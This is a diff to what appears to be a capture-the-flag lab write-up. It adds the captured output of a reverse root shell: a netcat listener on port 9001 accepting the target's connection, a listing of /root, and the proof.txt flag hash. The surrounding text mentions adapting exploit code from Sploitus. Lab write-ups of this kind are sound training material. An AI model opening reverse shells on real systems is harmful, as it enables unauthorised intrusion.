@@ -87,6 +87,25 @@ To gain access we attempt to place the Sploitus code with our local host and por
 With success, we achieve a reverse root shell and find the root flag in the root folder:
 		cat /root/proof.txt
 
+listening on [any] 9001 ...
+connect to [192.168.xxx.xx] from (UNKNOWN) [192.168.220.25] 35186
+pwd
+/var/www/html
+cd /root && ls -la
+total 32
+drwx------  3 root root 4096 Sep 12 16:27 .
+drwxr-xr-x 18 root root 4096 Jun 13  2023 ..
+-rw-------  1 root root   73 Jun 15  2023 .bash_history
+-rw-r--r--  1 root root  571 Apr 10  2021 .bashrc
+-rw-r--r--  1 root root   21 Jun 14  2023 email4.txt
+drwxr-xr-x  3 root root 4096 Jun 13  2023 .local
+-rw-r--r--  1 root root  161 Jul  9  2019 .profile
+-rw-r--r--  1 root root   33 Sep 12 16:27 proof.txt
+pwd
+/var/www/html
+cat /root/proof.txt
+1400207fd92a809c64088b690aee27af
+
 Flag -> ==1400207fd92a809c64088b690aee27af==
 # 
 
